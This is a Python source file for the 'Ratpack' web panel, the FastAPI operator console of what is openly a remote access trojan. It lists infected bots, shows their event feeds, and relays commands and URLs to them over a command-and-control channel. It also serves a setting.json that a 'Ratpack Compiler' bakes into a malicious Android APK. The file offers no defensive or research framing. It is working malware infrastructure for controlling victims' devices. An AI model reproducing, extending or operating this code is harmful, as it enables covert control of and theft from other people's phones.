"""
panel.py — the Ratpack web panel.

FastAPI application that serves:
  /                 bot list and live event feed
  /bot/<id>         per-bot console
  /setting.json     the configuration document for the Ratpack Compiler
  /login, /logout   session handling

The panel talks to the C2 over the control channel (localhost TCP), so the
panel and the bot-facing server can be started independently.
"""

import base64
import hmac
import json
import os
import socket
import time
from typing import Any, Dict, Optional

from fastapi import FastAPI, Form, HTTPException, Query, Request
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, Response
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

from . import config as cfgmod
from .botclient import ControlClient

HERE = os.path.dirname(os.path.abspath(__file__))
# The templates and static files live next to this module, inside the
# ratpack package.
TEMPLATES = os.path.join(HERE, "templates")
STATIC = os.path.join(HERE, "static")

app = FastAPI(title="Ratpack Panel", docs_url=None, redoc_url=None)
templates = Jinja2Templates(directory=TEMPLATES)

if os.path.isdir(STATIC):
    app.mount("/static", StaticFiles(directory=STATIC), name="static")

_client: Optional[ControlClient] = None


def client() -> ControlClient:
    global _client
    if _client is None:
        cfg = cfgmod.load()
        _client = ControlClient("127.0.0.1", int(cfg.get("c2", {}).get("port", 8777)) + 1)
    return _client


def control(req: dict, timeout: float = 30) -> dict:
    try:
        return client().call(req, timeout=timeout)
    except Exception as e:
        return {"ok": False, "error": f"{type(e).__name__}: {e}"}


# ---------------------------------------------------------------------------
# auth
# ---------------------------------------------------------------------------

def _hash(password: str) -> str:
    return base64.b64encode(
        hmac.new(b"ratpack", password.encode("utf-8"), "sha256").digest()
    ).decode()


def check_auth(request: Request) -> bool:
    cfg = cfgmod.load()
    web = cfg.get("web", {})
    expected_user = web.get("username", "admin")
    expected_pass = web.get("password", "")
    if not expected_pass:
        return True          # bot interface: no web credentials
    session = request.cookies.get("ratpack_session", "")
    return session == _hash(expected_user + ":" + expected_pass)


def require_auth(request: Request):
    if not check_auth(request):
        raise HTTPException(status_code=401, detail="authentication required")


# ---------------------------------------------------------------------------
# routes
# ---------------------------------------------------------------------------

@app.get("/login", response_class=HTMLResponse)
def login_form(request: Request):
    return templates.TemplateResponse(request, "login.html", {"error": None})


@app.post("/login")
def login(username: str = Form(...), password: str = Form(...)):
    cfg = cfgmod.load()
    web = cfg.get("web", {})
    if hmac.compare_digest(username, web.get("username", "admin")) and \
       hmac.compare_digest(password, web.get("password", "")):
        resp = RedirectResponse("/", status_code=302)
        resp.set_cookie("ratpack_session", _hash(username + ":" + password),
                        httponly=True, samesite="lax")
        return resp
    return templates.TemplateResponse(
        request, "login.html", {"error": "wrong credentials"}, status_code=401)


@app.get("/logout")
def logout():
    resp = RedirectResponse("/login", status_code=302)
    resp.delete_cookie("ratpack_session")
    return resp


@app.get("/setting.json")
def setting_json(request: Request):
    """
    The configuration document the Ratpack Compiler consumes.

    Downloaded by the operator and dropped into the compiler folder; the
    compiler bakes it into the APK as assets/setting.json and patches the
    payload's RatCfg with the same values.
    """
    require_auth(request)
    cfg = cfgmod.load()
    doc = cfgmod.build_setting_json(cfg)
    body = json.dumps(doc, indent=2, ensure_ascii=False)
    return Response(
        content=body,
        media_type="application/json",
        headers={
            "Content-Disposition": 'attachment; filename="setting.json"',
            "Cache-Control": "no-store",
        },
    )


@app.get("/", response_class=HTMLResponse)
def index(request: Request):
    require_auth(request)
    resp = control({"op": "list"}, timeout=10)
    bots = resp.get("bots", []) if resp.get("ok") else []
    events = []
    ev = control({"op": "events", "timeout": 0.7}, timeout=5)
    if ev.get("ok"):
        events = ev.get("events", [])
    return templates.TemplateResponse(request, "index.html", {
        "bots": bots,
        "events": events,
        "error": resp.get("error"),
        "config": cfgmod.load(),
    })


@app.get("/bot/{bot_id}", response_class=HTMLResponse)
def bot_page(request: Request, bot_id: str, cmd: str = Query(""), argument: str = Query("")):
    require_auth(request)
    resp = control({"op": "list"}, timeout=10)
    bots = resp.get("bots", []) if resp.get("ok") else []
    bot = next((b for b in bots if b["id"] == bot_id), None)

    output = ""
    if cmd and bot is not None:
        args: Dict[str, Any] = {}
        if argument:
            args["path"] = argument
            args["command"] = argument
            args["url"] = argument
        r = control({"op": "cmd", "bot": bot_id, "cmd": cmd,
                     "args": args, "timeout": 90}, timeout=100)
        output = json.dumps(r, indent=2, ensure_ascii=False)

    ev = control({"op": "bot_events", "bot": bot_id}, timeout=10)
    bot_events = ev.get("events", []) if ev.get("ok") else []

    return templates.TemplateResponse(request, "bot.html", {
        "bot": bot,
        "bots": bots,
        "output": output,
        "events": bot_events,
    })


@app.get("/api/bots")
def api_bots(request: Request):
    require_auth(request)
    return JSONResponse(control({"op": "list"}, timeout=10))


@app.get("/api/command")
def api_command(request: Request, bot: str, cmd: str, argument: str = ""):
    require_auth(request)
    args: Dict[str, Any] = {}
    if argument:
        args["path"] = argument
        args["command"] = argument
        args["url"] = argument
    return JSONResponse(control({"op": "cmd", "bot": bot, "cmd": cmd,
                                 "args": args, "timeout": 90}, timeout=100))


@app.get("/healthz")
def healthz():
    cfg = cfgmod.load()
    return {"ok": True, "mode": cfg.get("mode"), "time": time.time()}


def main():
    import uvicorn
    cfg = cfgmod.load()
    web = cfg.get("web", {})
    host = web.get("host", "127.0.0.1")
    port = int(web.get("port", 8080))
    print(f"Ratpack Panel on http://{host}:{port}")
    uvicorn.run(app, host=host, port=port, log_level="info")


if __name__ == "__main__":
    main()
